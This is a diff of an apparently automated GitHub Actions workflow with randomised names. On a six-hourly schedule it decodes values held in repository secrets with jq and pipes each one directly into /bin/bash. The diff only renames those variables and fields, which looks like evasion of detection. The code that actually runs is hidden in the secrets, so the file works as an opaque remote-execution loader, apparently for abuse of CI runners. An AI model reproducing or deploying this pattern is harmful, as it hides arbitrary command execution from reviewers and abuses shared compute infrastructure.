@@ -1,24 +1,23 @@
 name: tongmengxu4567
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '54 1/6 * * *'
-jobs:  # 17747
+    - cron: '10 0/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: tongmengxu4567
         env:
-          ug56129: ${{ secrets.ug56129 }}
+          kdp042: ${{ secrets.kdp042 }}
         run: |
-          echo $ug56129 | jq -r .uaufb2 | /bin/bash
-          echo $vwie84622 | jq -r .wb43194 | /bin/bash
-          echo $iebl67 | jq -r .s77444 | /bin/bash
-          echo $kcut3 | jq -r .jqkc4457 | /bin/bash
-          echo $c65637 | jq -r .e86298 | /bin/bash
-          echo $tbwsn04386 | jq -r .spgny89 | /bin/bash
-          echo $qvp2530 | jq -r .qg110 | /bin/bash
-          echo $q51 | jq -r .is82327 | /bin/bash
-          echo $i7 | jq -r .uuw30063 | /bin/bash
+          echo $kdp042 | jq -r .q0392 | /bin/bash
+          echo $wab864 | jq -r .ymz65872 | /bin/bash
+          echo $f1 | jq -r .cdv14 | /bin/bash
+          echo $ous4 | jq -r .udxcs69329 | /bin/bash
+          echo $iohg15530 | jq -r .rd773 | /bin/bash
+          echo $dwqy0551 | jq -r .tjact2 | /bin/bash
 
